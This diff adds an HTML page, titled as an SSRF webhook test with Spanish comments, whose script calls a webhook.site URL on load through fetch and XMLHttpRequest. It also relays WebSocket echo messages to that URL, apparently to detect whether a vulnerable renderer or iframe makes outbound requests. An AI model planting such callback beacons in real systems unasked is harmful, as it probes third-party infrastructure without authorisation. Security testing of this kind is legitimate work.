@@ -1,0 +1,47 @@
+<html>
+<head>
+  <title>SSRF Webhook Test</title>
+</head>
+<body>
+  <script>
+  window.onload = function() {
+    // Reemplaza 'TU_URL_DE_WEBHOOK' con la URL que obtuviste de webhook.site
+    const webhookUrl = 'https://webhook.site/7cdc61db-d2f3-4e50-aab4-9744f57a2a32';
+    
+    // Intenta hacer una solicitud GET al webhook
+    fetch(webhookUrl + '?source=iframe_test')
+      .then(response => response.text())
+      .then(data => console.log('Respuesta del webhook:', data))
+      .catch(error => console.error('Error:', error));
+    
+    // También podemos intentar con XMLHttpRequest para mayor compatibilidad
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', webhookUrl + '?source=xhr_test', true);
+    xhr.onload = function() {
+      console.log('XHR respuesta:', xhr.responseText);
+    };
+    xhr.onerror = function() {
+      console.error('XHR error');
+    };
+    xhr.send();
+    
+    // Intento de conexión WebSocket (aunque webhook.site no soporta WebSocket directamente)
+    try {
+      const ws = new WebSocket('ws://echo.websocket.org');
+      ws.onopen = () => {
+        console.log('WebSocket conectado');
+        ws.send('Mensaje desde iframe potencialmente vulnerable');
+      };
+      ws.onmessage = (event) => {
+        console.log('WebSocket mensaje recibido:', event.data);
+        // Envía el mensaje recibido al webhook
+        fetch(webhookUrl + '?source=websocket&message=' + encodeURIComponent(event.data));
+      };
+      ws.onerror = (error) => console.error('WebSocket error:', error);
+    } catch(e) {
+      console.error(e);
+    }
+  }
+  </script>
+</body>
+</html>
